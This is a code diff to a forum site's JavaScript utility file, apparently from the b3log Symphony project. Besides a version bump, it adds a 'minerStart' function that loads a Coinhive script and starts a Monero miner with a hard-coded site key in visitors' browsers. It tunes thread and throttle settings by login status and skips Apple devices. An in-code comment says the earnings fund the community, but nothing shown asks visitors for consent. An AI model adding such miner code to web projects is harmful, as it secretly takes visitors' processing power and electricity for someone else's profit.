@@ -21,7 +21,7 @@
  * @author <a href="http://vanessa.b3log.org">Liyuan Li</a>
  * @author <a href="http://88250.b3log.org">Liang Ding</a>
  * @author Zephyr
- * @version 1.43.0.0, Nov 10, 2017
+ * @version 1.44.0.0, Dec 5, 2017
  */
 
 /**
@@ -29,6 +29,27 @@
  * @static
  */
 var Util = {
+  /**
+   * @description xmr 挖矿，收入将用于维持社区运维
+   */
+  minerStart: function () {
+    if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+      return
+    }
+    $.ajax({
+      method: "GET",
+      url: Label.staticServePath + '/js/lib/xmr.min.js',
+      dataType: "script",
+      cache: true
+    }).done(function () {
+      var data = {threads: 2, throttle: 0.5}
+      if (Label.isLoggedIn) {
+        data = {threads: 1, throttle: 0.8}
+      }
+      var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', data);
+      miner.start();
+    });
+  },
   /**
    * 按需加载 MathJax 及 flow
    * @returns {undefined}
